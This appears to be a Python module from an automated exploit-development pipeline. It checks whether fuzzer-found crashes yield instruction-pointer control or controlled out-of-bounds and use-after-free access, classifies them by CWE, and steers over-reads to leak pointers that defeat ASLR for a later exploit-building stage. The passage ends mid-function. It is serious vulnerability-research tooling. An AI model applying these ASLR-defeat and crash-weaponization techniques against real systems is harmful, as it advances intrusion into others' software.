"""Phase 6 — the `poc_primitive` stage (L2): prove a confirmed crash yields instruction-
pointer control, via the cyclic-pattern technique and ptrace register capture. On success it
builds an L2 PoC bundle and promotes the finding. Native targets use the ptrace helper;
cross-arch (emulated) targets are captured via qemu-user's gdbstub (pc-based IP control)."""
from __future__ import annotations

import json
import pathlib
import re
import shutil

from ...db.dao import FindingDAO, FunctionDAO, PocDAO, TargetDAO

# What a CONFIRMED primitive proves about the defect, used only where root_cause's class does
# not already name a memory-corruption weakness (see the comment at the override below).
# Reaching a saved return address or an arbitrary address IS an out-of-bounds write, and a
# controlled read of memory the program did not intend to expose IS an out-of-bounds read.
_PRIM_CWE = {"instruction-pointer-control": "CWE-787",
             # A Windows stack smash that confirms control of the saved frame pointer / SEH
             # registration frame: the write itself is a stack-based buffer overflow.
             "seh-frame-control": "CWE-121",
             "write-what-where": "CWE-787",
             "arbitrary-write": "CWE-787",
             "arbitrary-read": "CWE-125",
             "controlled-read": "CWE-125",
             # A sanitizer-reported access, classified by the direction ASan states. An
             # out-of-bounds READ is CWE-125 whether or not its distance is attacker-chosen; the
             # distance decides the PoC LEVEL (L2 vs L1), not the weakness.
             "controlled-oob-read": "CWE-125",
             "oob-read": "CWE-125",
             "controlled-oob-write": "CWE-787",
             "oob-write": "CWE-787",
             # A LIFETIME defect's weakness is the lifetime error itself, in both directions: a
             # use-after-free READ is still CWE-416, because the defect is the use of released
             # memory and not the disclosure it happens to produce. As above, control decides the
             # LEVEL and not the weakness.
             "controlled-uaf-read": "CWE-416",
             "uaf-read": "CWE-416",
             "controlled-uaf-write": "CWE-416",
             "uaf-write": "CWE-416",
             "controlled-double-free": "CWE-415",
             "double-free": "CWE-415",
             "controlled-bad-free": "CWE-590",
             "bad-free": "CWE-590"}
# `alloc-dealloc-mismatch` is deliberately absent: its CWE (762) is not in the memory-corruption
# family this map is allowed to install, and it does not need to be. root_cause already labels
# that class CWE-762 from the sanitizer's own report, so the verdict relabels the TITLE and keeps
# the class it was given -- which is what `title_only` is for. Adding 762 here would have broken
# the invariant that every replacement is itself a class the override outranks, so a second pass
# over the same finding would flip the label back.

#: How a quantity-shaped defect headlines. Separate from `_EFF` because these are not keyed on
#: the verdict TYPE (which carries a `controlled-` prefix) but on the sanitizer class.
_QUANTITY_TITLE = {
    "allocation-size-too-big": "Resource exhaustion (attacker-sized allocation)",
    "out-of-memory": "Resource exhaustion (memory)",
    "memory-leak": "Resource exhaustion (memory leak)",
    "negative-size-param": "Memory corruption (negative length to a memory routine)",
    "array-index-out-of-bounds": "Memory corruption (out-of-bounds index)",
    "bad-shift": "Undefined behaviour (shift exponent)",
}
# root_cause classes that are already a memory-corruption defect and so are kept as-is.
# The one definition lives beside the finding vocabulary; a second copy here would drift.
import logging

from ... import observe
from ...db.models import OUTRANKS_PRIMITIVE_CWES as _MEM_CORRUPTION
from ...jobs.registry import register_stage
from .. import substrate
from ..debug import qemu_gdb, rootcause
from ..dynamic import sandbox
from ..dynamic.minimize import minimize
from ..dynamic.stage import (
    crash_finding_candidate,
    crash_key_parts,
)
from ..fuzz import aflpp
from ..fuzz.runner import place
from . import bundle, primitive
from .capture import (
    env_var_from_argv,
    how_to_feed,
    make_capture,
    make_qemu_capture,
    make_wine_capture,
    materialize_helper,
    plain_build_bytes,
    replay_exe_for,
    sweep_modes,
)

_log = logging.getLogger(__name__)

#: A decimal run long enough to be a field rather than a stray digit in a word. Bounded
#: above so a 40-digit blob is not multiplied into a gigabyte of input.
_DECIMAL_RUN = re.compile(rb"[0-9]{1,9}")
#: Ceiling on a grown decimal field: far past any plausible buffer, still cheap to run.
_DECIMAL_CAP = 1 << 20

# ISAs whose indirect branch MASKS bit 0 of the loaded PC (ARM/AArch64 for Thumb interworking,
# RISC-V because JALR is specified to clear it), so a captured fault PC is `value & ~1` and its
# cyclic window can alias one word early. Defined once, next to the gdbstub that also has to
# account for it when placing breakpoints.
_LSB_MASKED_PC = qemu_gdb.LSB_MASKED_PC

PRIMITIVE_STAGE = "poc_primitive"
TOOL = "primitive"
TOOL_VERSION = "primitive-1"


# 4, not 16. This threshold decides whether structure-preserving framing is OFFERED at all --
# and it is only an offer: the stage sweeps the framings against the live target and keeps
# whichever actually faults, so a bad guess costs one detonation. Measured on busybox's lzcat
# crash, whose 22 bytes carry a 9-byte filler run: at 16 the framing was never offered, the
# cyclic replaced the whole input, the LZMA header went with it and the target stopped faulting.
# A threshold that silently ends the chain is worse than an extra execution.
_MIN_FILLER_RUN = 4


from ..invocation import staged_name as _staged_name

#: The last decimal field in a preserved prefix: `...\n512\n` before the filler run. A target
#: that asks how many bytes it is about to read puts that number here.
_TRAILING_NUM = re.compile(rb"(?:\A|[\n ,=:])(\d{1,10})[\n ,=:]*\Z")


def relength_prefix(pre: bytes, run_len: int, new_len: int) -> bytes:
    """`pre` with its trailing LENGTH field rewritten from `run_len` to `new_len`, or unchanged.

    A structure-preserving framing has to preserve what the structure MEANS. The prefix of a
    menu-driven write is `2\n0\n512\n` -- option, index, and the number of bytes the target is
    about to `read()` -- so splicing a 1,064-byte cyclic in behind a field that still says 512
    leaves 552 bytes of pattern in the pipe: the target reads its 512, the next operation reads
    pattern garbage instead of the option that DETONATES the write, and the stage reports
    "cyclic pattern did not fault" on a target whose crash it was handed **[measured]**.

    Rewritten only when the field's value is at least the filler it governs, which is what makes
    it a length rather than an index or an id: the index in `2\n0\n512\n` is 0 and 0 < 512, so
    the field that is actually rewritten here is the one immediately before the payload. A
    prefix whose last number is too small is left exactly as it was.
    """
    m = _TRAILING_NUM.search(pre or b"")
    if not m or run_len <= 0:
        return pre
    try:
        if int(m.group(1)) < run_len:
            return pre
    except ValueError:                                   # pragma: no cover - \d+ is an int
        return pre
    return pre[:m.start(1)] + str(int(new_len)).encode() + pre[m.end(1):]


def filler_run_len(orig: bytes) -> int:
    """Length of the longest single-byte run in `orig` -- the filler `_overflow_frame` frames."""
    best = run_s = 0
    for i in range(1, len(orig or b"") + 1):
        if i < len(orig) and orig[i] == orig[run_s]:
            continue
        best = max(best, i - run_s)
        run_s = i
    return best


def _overflow_frame(orig: bytes):
    """(prefix, suffix) around the longest single-byte run in the crashing input -- the filler that
    smashes the frame.

    A structured input only faults when the structure around the overflow is intact: a config
    `name=<AAAA...>` crashes, but a whole-buffer cyclic (`aaaabaaac...`) is not a `name=` line, so
    the target never reaches the sink and L2 reports a false "no fault". Putting the cyclic exactly
    where the filler was keeps the `name=` prefix (and any trailing bytes) and reproduces the crash.
    Returns (b"", b"") when there is no significant run -- an unstructured input the pattern can
    replace whole, exactly as before."""
    if not orig:
        return b"", b""
    best_s = best_len = run_s = 0
    for i in range(1, len(orig) + 1):
        if i < len(orig) and orig[i] == orig[run_s]:
            continue
        if i - run_s > best_len:
            best_s, best_len = run_s, i - run_s
        run_s = i
    if best_len < _MIN_FILLER_RUN:
        return b"", b""
    return orig[:best_s], orig[best_s + best_len:]


def _slack_txt(slack):
    """Describe how the confirmed offset sits relative to the recovered buffer's frame base."""
    if slack > 0:
        return " + saved frame pointer"
    if slack < 0:
        return " - saved register slot"
    return " + saved frame"


def _hydrate_frames(ctx, target_id, target=None):
    """Recovered stack frames per function addr (empty if the target wasn't disassembled).

    Restricted to the PROGRAM's own functions where the symbol table can say which those are.
    A statically linked binary carries its libc, and the candidate ranking prefers the
    tightest buffer -- so on jhead every attempt went into 8-byte scratch buffers inside
    glibc, and the stage spent its whole budget without touching jhead's own frames.
    """
    fdao = FunctionDAO(ctx.conn)
    functions = fdao.list_by_target(target_id)
    ranges, base = (), 0
    if target is not None:
        try:
            from ..debug import rootcause
            from ..elf import parse as parse_elf
            from ..elf import program_ranges
            blob = ctx.content.path(target.sha256).read_bytes()
            ranges = program_ranges(blob)
            base = rootcause.image_base(functions, parse_elf(blob).entry) or 0
        except Exception:
            observe.absorbed(_log, "keeping the default")
            ranges = ()
    frames = {}
    for f in functions:
        if not f.blocks:
            continue
        if ranges and not _own_code(f.addr, base, ranges):
            continue
        full = fdao.get(f.id)
        if full and full.frame and full.frame.get("vars"):
            frames[f.addr] = full.frame
    return frames


def _own_code(addr, base, ranges) -> bool:
    import bisect
    try:
        a = (int(addr, 16) if isinstance(addr, str) else int(addr or 0)) - base
    except (TypeError, ValueError):
        return True
    los = [lo for lo, _ in ranges]
    i = bisect.bisect_right(los, a) - 1
    return i >= 0 and a < ranges[i][1]


#: How many input variants steps 2b/2c detonate. Each one is a full sandbox run, so this is a
#: budget, not a sample size: it buys the ONE bit the verdict turns on (does the distance move?).
_OOB_VARIANTS = 10
#: Byte deltas tried at a sampled offset. A length field that sets a read size usually responds
#: to being made larger, so a large additive delta and a saturated byte are the two probes most
#: likely to move the distance without destroying the structure around them.
_OOB_DELTAS = (0x40, 0xff)


def _detonate_for_report(ctx, target, exe, mode, base_argv, data, timeout):
    """Run `exe` on `data` and return the parsed sanitizer report, or None.

    Separate from `make_capture` on purpose: the ptrace helper returns registers and throws the
    child's stderr away, and for this class of defect the stderr IS the evidence. Nothing about
    the registers of an ASan abort is informative.
    """
    rep, _out = _detonate_capturing(ctx, target, exe, mode, base_argv, data, timeout)
    return rep


def _detonate_capturing(ctx, target, exe, mode, base_argv, data, timeout, *, aslr=False):
    """`(report, stdout)` for one detonation.

    The uninitialised-memory verdict needs the program's OWN OUTPUT, not just its report: MSan
    names the bytes undefined as they enter the output call and the call then goes through, so the
    residue it is complaining about is on stdout of the very same run **[measured]**. That is what
    makes "whose bytes are these" answerable at all, and the answer is the difference between a
    disclosure of zeroes and a disclosure of the attacker's own input.
    """
    from ..debug.rootcause import parse_asan_report
    work = ctx.scratch()
    argv, stdin_bytes, env = list(base_argv), None, None
    if mode == "stdin":
        stdin_bytes = data
    elif mode == "file":
        (work / "oob_input.bin").write_bytes(data)
        argv = place(argv, str(work / "oob_input.bin"))
    elif mode == "arg":
        try:
            argv = place(argv, sandbox.argv_arg(data, truncate=True))
        except sandbox.ArgvNulError:
            return None, b""
    elif mode == "env":
        var, argv = env_var_from_argv(argv)
        if not var:
            return None, b""
        env = {var: data.decode("latin-1")}
    else:
        return None, b""
    try:
        res = sandbox.run(exe, argv=argv, stdin=stdin_bytes, timeout=timeout,
                          arch=target.arch, endianness=target.endianness, bits=target.bits,
                          env_overrides=env, aslr=aslr)
    except Exception:                                    # noqa: BLE001 -- advisory step
        return None, b""
    return (parse_asan_report((res.stderr or b"").decode("utf-8", "replace")),
            res.stdout or b"")


def _probe_variants(orig: bytes, pre: bytes, post: bytes):
    """`(label, bytes)` inputs that probe whether the reach of the defect is ours to choose.

    Shared by the out-of-bounds verdict (does the DISTANCE past the end move?) and the lifetime
    verdict (does the OFFSET inside the freed chunk, or its SIZE, move?). The families below are
    about how an input sets a number, which is the same question in both cases.

    Two families, because two shapes of input set the reach two different ways:
      * the filler run -- an unstructured overflow reads/writes as far as the run is long, so
        extending and truncating it moves the distance directly;
      * a field value -- a structured input (a TIFF tag, a packet length) sets the reach with a
        NUMBER, and its file size is irrelevant. Those are probed two ways: by GROWING a decimal
        digit run, which is how a textual length field is written and the only mutation that
        keeps it a number; and by raising sampled bytes, which is what reaches a binary field.
    """
    out = [("orig", orig)]
    # A DECIMAL FIELD, raised. The docstring below promises this family -- "a structured input
    # sets the reach with a NUMBER" -- and the implementation only ever raised sampled BYTES,
    # which is not the same thing at all: adding 0x10 to a digit of `400` gives a non-digit that
    # `strtol` stops at, so the number gets SMALLER and the access comes back in bounds. Measured
    # on a `show=<N>` over-read: 1 of 17 variants faulted, every distance was identical, and the
    # verdict was "the distance did not move with the input" on a read whose length the attacker
    # literally types. Growing the digit run keeps it a valid number and makes the reach move,
    # which is the one experiment that separates this defect from a primitive.
    for m in _DECIMAL_RUN.finditer(orig):
        if len(out) >= _OOB_VARIANTS:
            break
        txt = m.group(0)
        try:
            n = int(txt)
        except ValueError:                               # pragma: no cover - regex guarantees it
            continue
        if n >= _DECIMAL_CAP:
            # Already past any plausible buffer. Growing it further asks the target to read
            # billions of bytes for no extra evidence, and clamping instead would SHRINK the
            # field -- the opposite mutation, and the one that stops it faulting.
            continue
        emitted = set()
        for mult, tag in ((4, "x4"), (16, "x16")):
            if len(out) >= _OOB_VARIANTS:
                break
            grown = str(min(n * mult if n else 4096, _DECIMAL_CAP)).encode()
            if grown == txt or grown in emitted:
                continue
            emitted.add(grown)
            out.append((f"dec@{m.start():#x}={tag}",
                        orig[:m.start()] + grown + orig[m.end():]))
    body = orig[len(pre):len(orig) - len(post)] if (pre or post) else orig
    if len(body) >= _MIN_FILLER_RUN:
        filler = body[:1] or b"A"
        for d in (64, 256):
            out.append((f"filler+{d}", pre + body + filler * d + post))
        half = len(body) // 2
        if half >= _MIN_FILLER_RUN:
            out.append((f"filler-{len(body) - half}", pre + body[:half] + post))
    # Sampled byte probes, spread across the input so a length field anywhere in a header gets
    # hit. Offsets are evenly spaced rather than random: a verdict that changes between two runs
    # of the same stage on the same input is not a verdict.
    room = max(0, _OOB_VARIANTS - len(out))
    if room and orig:
        step = max(1, len(orig) // max(1, room // len(_OOB_DELTAS) or 1))
        for i in range(0, len(orig), step):
            for d in _OOB_DELTAS:
                if len(out) >= _OOB_VARIANTS:
                    return out
                b = bytearray(orig)
                b[i] = (b[i] + d) & 0xFF if d != 0xFF else 0xFF
                out.append((f"byte@{i:#x}={b[i]:#02x}", bytes(b)))
    return out


def _oob_primitive(ctx, target, exe, mode, base_argv, orig, pre, post, timeout, first=None):
    """Step 2b: the out-of-bounds-access verdict, or None when this is not that kind of fault."""
    first = first or _detonate_for_report(ctx, target, exe, mode, base_argv, orig, timeout)
    if not first or first.get("class") not in primitive.OOB_CLASSES:
        return None                                      # not a sanitizer-reported OOB access
    ctx.progress(msg=f"{first['class']} ({first.get('access')}): varying the input to see "
                     f"whether the out-of-bounds distance is attacker-controlled")
    obs = [("orig", first)]
    for label, data in _probe_variants(orig, pre, post)[1:]:
        rep = _detonate_for_report(ctx, target, exe, mode, base_argv, data, timeout)
        if rep:
            obs.append((label, rep))
    prim = primitive.oob_access_primitive(obs)
    if prim is not None:
        # `overrun_*` beside `distance_*`, because they answer different questions and only one
        # of them is the magnitude of the defect: `distance` is where the access STARTED relative
        # to the object, and a bulk access that begins inside and runs off the end starts at
        # offset 0 -- so a 400-byte read of a 64-byte buffer was reported as distance 0 and read
        # as "not out of bounds at all". See `primitive._overrun`.
        ctx.emit("primitive.oob", payload={
            "class": prim["sanitizer_class"], "access": prim["access"],
            "distance_min": prim["distance_min"], "distance_max": prim["distance_max"],
            "overrun_min": prim.get("overrun_min"), "overrun_max": prim.get("overrun_max"),
            "region_size": prim["region_size"], "controlled": prim["confirmed"],
            "variants_detonated": len(obs), "observations": prim["observations"][:10]})
        # ...and for a READ, whether the bytes reach the attacker and defeat ASLR. This is what
        # the rung above needs: a recovered base is the input `build_exploit` otherwise has to
        # obtain from a stack over-read, which a heap over-read never provides.
        disc = _oob_disclosure(ctx, target, mode, base_argv, orig, prim, timeout)
        if disc and disc.get("proved"):
            prim["disclosure"] = {k: disc[k] for k in
                                  ("pie_base", "libc_base", "canary", "rule", "note",
                                   "input_sha")}
    return prim


#: Where to look for the host libc image, so a leaked libc pointer can be corroborated against
#: real symbol offsets rather than against a guess. Absent is not fatal: the PIE base and the
#: canary come from the target's own layout, and only the libc rung needs this.
_LIBC_PATHS = ("/usr/lib/x86_64-linux-gnu/libc.so.6", "/lib/x86_64-linux-gnu/libc.so.6",
               "/usr/lib/libc.so.6", "/lib64/libc.so.6")


def _host_libc_bytes() -> bytes:
    for cand in _LIBC_PATHS:
        try:
            p = pathlib.Path(cand)
            if p.exists():
                return p.read_bytes()
        except OSError:
            continue
    return b""


def _crash_isolation(ctx, target, input_sha) -> str:
    """The isolation tag the run that FOUND this input recorded, or "".

    The record of HOW a crash was produced, which the stages that re-run it have to honour: a
    libFuzzer harness, a prompted delivery, a socket -- and now a guard-page allocator.
    """
    try:
        from ...db.dao import DynResultDAO
        for r in DynResultDAO(ctx.conn).list_by_target(target.id):
            if r.input_sha == input_sha and r.isolation:
                return str(r.isolation)
    except Exception:                                    # noqa: BLE001 -- advisory
        observe.absorbed(_log, "answering unknown isolation")
    return ""


def _plain_for_disclosure(ctx, target):
    """(exe, binary-bytes) of an UNINSTRUMENTED build to observe a disclosure on, or None.

    Shared by the two disclosure experiments -- the sanitizer-measured out-of-bounds read and the
    address-control one -- because the staging rule is the same and this project has paid for
    keeping two copies of one rule before. Under ASan the process aborts INSIDE the read, so the
    build that DETECTS the leak is the one build that cannot DEMONSTRATE it; what an attacker has
    is the plain program. The bytes come back too, because a leaked pointer is resolved against
    the layout of the binary that was actually run.
    """
    target_bytes = ctx.content.path(target.sha256).read_bytes()
    plain = ctx.scratch() / "disclose" / "plain.bin"
    plain.parent.mkdir(parents=True, exist_ok=True)
    blob = plain_build_bytes(ctx, target)
    if blob is not None:
        plain.write_bytes(blob)
        target_bytes = blob
    elif aflpp.is_sanitizer_build(target_bytes):
        # Nothing to detonate that would survive the read. Say so rather than reporting a quiet
        # "no pointers found", which reads as evidence the leak is harmless.
        ctx.emit("primitive.disclosure", payload={
            "proved": False, "rule": "not-observable",
            "note": "the only build of this program here is instrumented, so it aborts inside "
                    "the out-of-bounds read and emits nothing; the disclosure is not observable "
                    "without an uninstrumented build of the same source"})
        return None
    else:
        ctx.content.stage_target(target, plain.parent, plain.name)
    plain.chmod(0o755)
    return plain, target_bytes


#: Values to try for the lever byte when steering a controlled read INTO mapped memory. ZERO
#: first, then small: the address is the attacker's index times a stride, so index 0 starts the
#: read at the object itself and runs off its end into the adjacent chunk -- the classic place a
#: live pointer sits -- and the smallest indices stay nearest it.
_DISCLOSE_VALUES = (0x00, 0x01, 0x02, 0x03, 0x04, 0x08, 0x10, 0x20)

#: Small DECIMAL fields to steer a numeric index/length toward. The same intent as
#: `_DISCLOSE_VALUES`, one level up: the lever is a `dump=<N>` style decimal field, not a raw
#: byte, so the small values are the ASCII numbers, not the small bytes.
_DISCLOSE_DECIMALS = (b"0", b"1", b"2", b"4", b"8")


def _digit_runs(data: bytes):
    """Maximal runs of ASCII digits in `data`, as (start, end) half-open spans.

    A decimal index/length field (`dump=<N>`) is the lever for an address-control read, but a
    single-byte flip of one of its digits does not isolate as one: `strtoul` of a flipped digit
    is not linear in the byte (0xff is not a digit at all, so the field re-parses to a different
    number), so `address_primitive` legitimately reports no byte lever and `offset` is None. The
    field is still the lever; steer it as a WHOLE, which is what this finds.
    """
    runs, i, n = [], 0, len(data)
    while i < n:
        if 0x30 <= data[i] <= 0x39:
            j = i
            while j < n and 0x30 <= data[j] <= 0x39:
                j += 1
            runs.append((i, j))
            i = j
        else:
            i += 1
    return runs


def _address_disclosure(ctx, target, mode, base_argv, orig, prim, timeout):
    """Steer the controlled read into MAPPED memory and see whether the program hands bytes back.

    The L2 -> L3 bridge for the address-control family. `_oob_disclosure` can detonate the input
    that FOUND the defect, because a sanitizer-measured over-read survives on the plain build and
    prints. Here the measured input is one that CRASHES -- that is how the address was measured --
    so there is nothing on stdout to resolve. But the verdict named the lever: the input byte that
    chooses the address, and the stride it moves by. Turn the lever down and the same read lands
    inside a mapped page, the program survives, and whatever it printed is the disclosure.

    Everything after that is the existing machinery: `leak.disclosed_bases` resolves a leaked
    pointer's page-invariant low bits against the binary's own symbol layout, with ASLR ON, and
    `build_exploit` inherits the provoking INPUT (never the base, which dies with the process).

    Returns the disclosure dict, or None when the fault is a write, no lever was isolated, every
    steered variant still crashes, or nothing recoverable reached the output.
    """
    if prim.get("access") != "read":
        return None
    off = prim.get("offset")
    off = int(off) if off is not None and int(off) < len(orig) else None
    from . import leak as _leak
    try:
        staged = _plain_for_disclosure(ctx, target)
        if staged is None:
            return None
        plain, target_bytes = staged
        benign = orig[:8] if len(orig) > 8 else b"\x00" * 4
        _r2, base_out = _detonate_capturing(ctx, target, plain, mode, base_argv, benign,
                                            timeout, aslr=True)
        # Judge a survivor by WHAT it disclosed, not by how much. Every surviving variant here
        # prints the same number of bytes, so "most bytes" picked whichever ran first -- measured
        # on the fixture: index 1 lands in mapped-but-zero heap under the sandbox's larger arena,
        # survives, prints 128 zero bytes and resolves nothing, while index 0 runs off the end of
        # the object into the adjacent chunk and hands back a live code pointer. The question the
        # experiment exists to answer is whether a BASE comes back, so ask it per survivor.
        # THE ORIGINAL INPUT FIRST, unsteered. A read found under the guard-page allocator
        # faults only BECAUSE of the oracle: without it the same read is silent, which is the
        # one condition under which its bytes reach the output. So the first candidate is simply
        # the crashing input replayed on the plain build -- measured on the address-leak fixture,
        # whose `dump=` over-read reads 64 bytes past a 64-byte chunk and prints them happily
        # once nothing is guarding the page. Steering is for the case where the read is far out
        # of bounds on its own.
        candidates = [(None, bytes(orig))]
        if off is not None:
            candidates += [(v, bytes(bytearray(orig)[:off]) + bytes([v]) + bytes(orig[off + 1:]))
                           for v in _DISCLOSE_VALUES if v != orig[off]]
        # Steer the numeric index/length field toward zero. The crashing input the campaign
        # found is often FAR out of bounds (`dump=99` -> +0x63000), so it faults with or without
        # the guard page and discloses nothing when replayed -- while the SMALLEST index reads
        # just off the end of the object into the adjacent chunk, which is where a live pointer
        # sits. A single-byte lever covers a raw binary index; this covers the decimal field that
        # `address_primitive` cannot isolate as one byte (so `off` is None), which is the common
        # shape for a text protocol. Measured on the address-leak fixture: `dump=0` discloses the
        # neighbour chunk and `leak.disclosed_bases` resolves the PIE and libc bases with ASLR on,
        # where `dump=99` (the found crash) discloses nothing.
        _seen_vars = {bytes(orig)} | {var for _v, var in candidates}
        for lo, hi in _digit_runs(orig):
            for small in _DISCLOSE_DECIMALS:
                var = bytes(orig[:lo]) + small + bytes(orig[hi:])
                if var not in _seen_vars:
                    _seen_vars.add(var)
                    candidates.append((None, var))
        best = None
        from collections import Counter as _Counter
        _code_counts: _Counter = _Counter()
        _exec_ranges = _leak.executable_vaddr_ranges(target_bytes)
        _word = 8 if (target.bits or 64) >= 64 else 4
        for v, var in candidates:
            _rep, out = _detonate_capturing(ctx, target, plain, mode, base_argv, bytes(var),
                                            timeout, aslr=True)
            # A variant that still faults tells us nothing: the read has to RETURN for its bytes
            # to reach the output. "More than the baseline" is NOT the test, though, and using it
            # as one cost a proved disclosure: the baseline is the input truncated to 8 bytes,
            # and on a `dump=<index>` line that truncation is still a valid dump command -- so
            # the baseline printed the same 128 bytes as the real run and the comparison rejected
            # a leak that was right there. `disclosed_bases` says the same thing about its own
            # `baseline` argument: it is for reporting how many bytes were EXTRA, never the
            # oracle. So the gate is "it survived and printed something" and the resolver judges.
            if not out:
                continue
            # Collect in-image code pointers from EVERY surviving variant, weighted by how often
            # each appears. A win()-like target is leaked by the SMALL-index neighbour read (where
            # it is stored, often more than once), which is NOT the same variant that proves a
            # libc base (the far read) -- so we must not stop at the first proved one, or the win
            # pointer the exploit stage needs would never be collected. See `_disclosed_code_ptrs`.
            for cp in _leak.disclosed_code_pointers(out, _exec_ranges, word=_word, limit=32):
                _code_counts[cp] += out.count(cp.to_bytes(_word, "little"))
            cand = _leak.disclosed_bases(out, target_bytes, _host_libc_bytes(),
                                         baseline=base_out)
            if cand.get("proved"):
                if best is None:
                    best = (bytes(var), out, cand)        # first proved base wins the disclosure,
                continue                                  # but keep scanning for code pointers
            if best is None or int(cand.get("distinct") or 0) > int(best[2].get("distinct") or 0):
                best = (bytes(var), out, cand)
        if best is None:
            ctx.emit("primitive.disclosure", payload={
                "proved": False, "rule": "no-survivor",
                "note": ("the read's address is the attacker's to choose, but no variant both "
                         "survived and printed more than the baseline "
                         + (f"(the crashing input and {len(candidates) - 1} steered variants "
                            f"were tried: {len(_DISCLOSE_VALUES)} values of input byte {off}"
                            if off is not None else
                            f"(the crashing input and {len(candidates) - 1} steered variants "
                            f"were tried: no single input byte isolated as the lever")
                         + (f", plus small decimal values of {len(_digit_runs(orig))} numeric "
                            f"field(s)" if _digit_runs(orig) else "")
                         + "), so the bytes it reads were not observed leaving the process")})
            return None
        d = best[2]
        # Leaked CODE pointers, for a ret2win target the disassembler cannot see. A stripped
        # binary whose win()-like function is reached only through a stored pointer (a callback, a
        # vtable slot) is never analysed -- no call references it -- so `find_win` is blind to it,
        # but the read just disclosed its runtime address. Record the pointers that land in the
        # target's own executable segment, most-repeated first (a deliberately-stored callback is
        # leaked more than once); the exploit stage tries each as a ret2win target, confirmed by a
        # spawned shell, so a non-win pointer is rejected rather than faked.
        d["code_ptrs"] = [cp for cp, _ in _code_counts.most_common(8)]
    except Exception:                                     # noqa: BLE001 -- best-effort experiment
        observe.absorbed(_log, "answering None")
        return None
    # The provoking input is the STEERED variant, not the crashing one the verdict was measured
    # from, so it is stored and named here -- `_l2_disclosure_triggers` fetches these bytes and
    # re-runs them in the weaponizer's own process to recover the base live.
    d["input_sha"] = ctx.put_artifact("poc-l2-disclosure-input", data=best[0])
    ctx.emit("primitive.disclosure", payload={
        "proved": d["proved"], "rule": d["rule"], "distinct_pointers": d["distinct"],
        "pie_base": d["pie_base"], "libc_base": d["libc_base"], "canary": d["canary"],
        "disclosed_bytes": d["disclosed_bytes"], "note": d["note"],
        "code_ptrs": d.get("code_ptrs") or [],
        "steered_byte": off, "steered_to": (best[0][off] if off is not None else None),
        "steered_input": best[0][:32].decode("latin-1"),
        "input_sha": d["input_sha"]})
    ctx.progress(msg=(("the steered read defeats ASLR: " + d["note"]) if d["proved"]
                      else "the steered read discloses data, but no base was corroborated")[:90])
    return d


def _oob_disclosure(ctx, target, mode, base_argv, orig, prim, timeout):
    """Does the out-of-bounds READ hand its bytes back, and do they defeat ASLR?

    The experiment the out-of-bounds verdict could not do. `oob_access_primitive` proves the
    access is out of bounds and that the attacker chooses how far past the end it reaches; it
    cannot say whether what came back is worth anything, and that is what decides the rung above.
    Adjacent memory full of pointers defeats ASLR; adjacent memory full of pixel data does not.

    An OOB READ can never reach L3 by itself -- disclosure is not control -- so this does not
    pretend to. What it produces is the one input `build_exploit` cannot otherwise obtain for a
    position-independent or ASLR'd target: a recovered load base. The exploit stage already knows
    what to do with one (it consumes `recon["pie_base"]`/`recon["libc_base"]` from a stack
    over-read); a heap over-read never reaches that code, so the base it needs stops here.

    Two things make the experiment possible at all:

      * **Not on the build that found it.** Under ASan the process aborts INSIDE the read, so
        nothing reaches stdout -- the build that DETECTS the leak is the one build that cannot
        DEMONSTRATE it. This detonates the ingested program, which is what an attacker has.
      * **No output differencing.** The uninitialised-value class was measured undecidable that
        way, and this class does not need it: a pointer's low 12 bits are page-invariant under
        ASLR, so a leaked slot validates itself against the target's own symbol layout. The
        benign run is still made, but only to report how many bytes were EXTRA. It is never the
        oracle (see `leak.disclosed_bases`).

    Returns the disclosure dict, or None when the fault is not a read, nothing was emitted, or
    the only build available aborts inside the read -- and emits the reason in that last case,
    because "no base recovered" and "the leak was never observable here" are not the same answer.
    """
    if prim.get("access") != "read":
        return None                                      # a write discloses nothing to its caller
    from . import leak as _leak
    try:
        staged = _plain_for_disclosure(ctx, target)
        if staged is None:
            return None
        plain, target_bytes = staged
        # An input that stays in bounds, for the EXTRA-bytes figure only. Short rather than
        # empty: a parser handed nothing often refuses before it prints anything at all, and a
        # baseline of "" would overstate how much the out-of-bounds run disclosed.
        benign = orig[:8] if len(orig) > 8 else b"\x00" * 4
        # WITH ASLR ON. Every other run in this stage disables it so a crash reproduces at a
        # stable address, and for this one experiment that would hollow out the claim: a verdict
        # that says "ASLR is defeated" has demonstrated nothing about randomization if the
        # process it read had randomization turned off. The method does not need the stability --
        # it resolves a leaked pointer's page-invariant low bits against the target's own symbol
        # layout -- so this pays the real cost and the recovered base is a real one.
        _r1, oob_out = _detonate_capturing(ctx, target, plain, mode, base_argv, orig, timeout,
                                           aslr=True)
        _r2, base_out = _detonate_capturing(ctx, target, plain, mode, base_argv, benign, timeout,
                                            aslr=True)
        if not oob_out:
            return None                                  # the read happens, but nothing escapes
        d = _leak.disclosed_bases(oob_out, target_bytes, _host_libc_bytes(), baseline=base_out)
    except Exception:                                     # noqa: BLE001 -- best-effort experiment
        observe.absorbed(_log, "answering None")
        return None
    # The provoking INPUT, not just the result. The rung above cannot use a recovered base -- it
    # is stale as soon as this process exits -- so what it inherits is the recipe: this input, on
    # the channel L2 measured, re-run in the weaponizer's own process to recover the base live.
    d["input_sha"] = (ctx.params or {}).get("input_sha")
    ctx.emit("primitive.disclosure", payload={
        "proved": d["proved"], "rule": d["rule"], "distinct_pointers": d["distinct"],
        "pie_base": d["pie_base"], "libc_base": d["libc_base"], "canary": d["canary"],
        "disclosed_bytes": d["disclosed_bytes"], "note": d["note"],
        "input_sha": d["input_sha"]})
    # `disclosed_bytes` is None when the benign run printed nothing, so there was no baseline to
    # subtract -- not zero bytes. Say "data" rather than render it as "None byte(s)".
    _vol = (f"{d['disclosed_bytes']} byte(s)" if isinstance(d.get("disclosed_bytes"), int)
            else "data")
    ctx.progress(msg=("the read's own output defeats ASLR: " + d["note"])[:90] if d["proved"]
                 else f"the read discloses {_vol}, but no base could be corroborated")
    return d


def _lifetime_primitive(ctx, target, exe, mode, base_argv, orig, pre, post, timeout, first=None):
    """Step 2c: the lifetime-defect verdict (use-after-free, double free), or None.

    Same experiment as step 2b, different question. The out-of-bounds verdict asks how far past
    the end of an object the access reached; for a dead object that has no meaning. What decides
    whether a lifetime defect is a primitive is whether the attacker chooses WHICH PART of the
    stale chunk is touched and HOW BIG the chunk is -- see `primitive.lifetime_primitive`.
    """
    first = first or _detonate_for_report(ctx, target, exe, mode, base_argv, orig, timeout)
    if not first or first.get("class") not in primitive.LIFETIME_CLASSES:
        return None
    ctx.progress(msg=f"{first['class']}: varying the input to see whether the offset inside the "
                     f"freed chunk, or its size, is attacker-controlled")
    obs = [("orig", first)]
